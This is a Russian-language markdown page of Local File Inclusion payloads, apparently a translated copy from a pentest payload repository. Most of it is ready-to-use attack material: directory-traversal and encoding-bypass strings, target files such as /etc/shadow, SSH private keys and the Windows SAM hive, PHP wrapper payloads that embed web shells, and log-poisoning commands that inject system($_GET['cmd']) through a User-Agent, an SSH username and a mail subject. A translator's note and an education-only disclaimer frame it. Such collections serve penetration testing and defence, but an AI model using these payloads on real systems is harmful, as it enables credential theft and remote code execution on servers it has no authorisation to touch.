<a id="-lfi-payloads-collection"></a>
# 📂 Коллекция полезных нагрузок LFI

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)

[← Русское оглавление](../../README.ru.md) · [Английский оригинал](../LFI.md)

> **Уточнение к оригиналу.** Нулевой байт `%00` относится к старым сценариям: соответствующая ошибка PHP [исправлена в 5.3.4](https://bugs.php.net/bug.php?id=39863). Обёртки и выполнение кода зависят от настроек и способа включения; [expect:// не включён по умолчанию](https://www.php.net/manual/en/wrappers.expect.php). Доступ к файлу не означает автоматического выполнения PHP: для отравления журналов требуется включение и интерпретация подходящего содержимого. Исходные примеры сохранены.

[🇹🇷 Türkçe Sürüm](LFI.tr.md) • [🇬🇷 Ελληνικά](LFI.el.md)

```
  ██╗     ███████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██║     ██╔════╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ██║     █████╗  ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ██║     ██╔══╝  ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████╗██║     ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

<a id="-linux-files"></a>
## 🐧 Файлы Linux

<a id="basic-traversal"></a>
### Базовый обход каталогов
```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

<a id="url-encoded"></a>
### URL-кодирование
```
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

<a id="bypass-techniques"></a>
### Способы обхода
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.php
```

<a id="interesting-linux-files"></a>
### Файлы Linux, представляющие интерес
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/group
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
/root/.ssh/id_rsa
```

---

<a id="-windows-files"></a>
## 🪟 Файлы Windows

<a id="basic-traversal-1"></a>
### Базовый обход каталогов
```
C:\Windows\System32\drivers\etc\hosts
C:/Windows/System32/drivers/etc/hosts
..\..\..\..\Windows\System32\drivers\etc\hosts
....\\....\\....\\Windows\\System32\\drivers\\etc\\hosts
```

<a id="interesting-windows-files"></a>
### Файлы Windows, представляющие интерес
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini
C:\inetpub\logs\LogFiles
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\Program Files\FileZilla Server\FileZilla Server.xml
```

---

<a id="-wrappers-php"></a>
## 🔄 Обёртки потоков PHP (wrappers)

<a id="phpfilter-read-source"></a>
### php://filter (чтение исходного кода)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
```

<a id="phpinput-rce"></a>
### php://input (RCE)
```
php://input
POST: <?php system('id'); ?>
```

<a id="data-wrapper"></a>
### Обёртка data://
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>
```

<a id="expect-rce"></a>
### expect:// (RCE)
```
expect://id
expect://whoami
```

<a id="zip-wrapper"></a>
### Обёртка zip://
```
zip://path/to/file.zip%23shell.php
```

<a id="phar-wrapper"></a>
### Обёртка phar://
```
phar://uploads/shell.jpg/test.php
```

---

<a id="-log-poisoning-rce"></a>
## 🔥 Внедрение в журналы (RCE)

<a id="apache-access-log"></a>
### Журнал доступа Apache
```bash
# 1. Внедрить PHP через User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Включить файл журнала
?page=/var/log/apache2/access.log&cmd=id
```

<a id="ssh-log"></a>
### Журнал SSH
```bash
# 1. Внедрить через SSH
ssh '<?php system($_GET["cmd"]);?>'@target.com

# 2. Включить журнал
?page=/var/log/auth.log&cmd=id
```

<a id="mail-log"></a>
### Почтовый журнал
```bash
# 1. Отправить письмо с внедрённым кодом
mail -s "<?php system(\$_GET['cmd']); ?>" target@localhost

# 2. Включить журнал
?page=/var/log/mail.log&cmd=id
```

<a id="proc-environ"></a>
### Окружение процесса в proc
```
?page=/proc/self/environ
# User-Agent: <?php system('id'); ?>
```

---

<a id="-quick-reference"></a>
## 📊 Краткий справочник

<a id="detection"></a>
### Обнаружение
```
?page=../../../etc/passwd
?file=....//....//etc/passwd
?path=/etc/passwd%00
```

<a id="filter-bypass"></a>
### Обход фильтров
| Фильтр | Обход |
|--------|--------|
| `../` заблокировано | `....//`, `..././` |
| `.php` обязательно | `%00`, нулевой байт |
| Белый список | Обёртки php:// |

<a id="common-parameters"></a>
### Распространённые параметры
```
page, file, path, include, doc
document, folder, root, pg, style
template, view, content, load
```

---

<a id="-resources"></a>
## 📚 Ресурсы

- [PayloadsAllTheThings LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---

<p align="center">
  <b>📂 Набор полезных нагрузок LFI</b><br>
  <i>Только в образовательных целях!</i>
</p>
